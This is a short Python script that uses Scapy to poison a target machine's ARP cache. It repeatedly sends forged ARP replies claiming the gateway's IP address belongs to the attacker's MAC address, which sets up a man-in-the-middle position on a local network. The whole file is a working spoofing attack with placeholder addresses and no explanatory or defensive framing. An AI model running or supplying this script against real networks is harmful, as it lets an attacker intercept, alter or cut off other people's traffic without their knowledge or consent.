

from scapy.all import ARP, sendp,Ether
import time

target_ip = "192.168.101.195"
target_mac = "ab:cd:ef:gh:ij:kl"  
gateway_ip = "192.168.96.1"

attacker_mac = "ab:cd:ef:gh:ij:kl"  # Replace with the actual MAC address of your machine
ether=Ether(src=attacker_mac,dst=target_mac)
arp_response = ether/ARP(op=2, psrc=gateway_ip, hwsrc=attacker_mac, pdst=target_ip, hwdst=target_mac)

while True:
    sendp(arp_response, verbose=False)
    print(f"Sent ARP reply to {target_ip} to poison its ARP cache. It will now map {gateway_ip} to {attacker_mac}.")
    time.sleep(1)

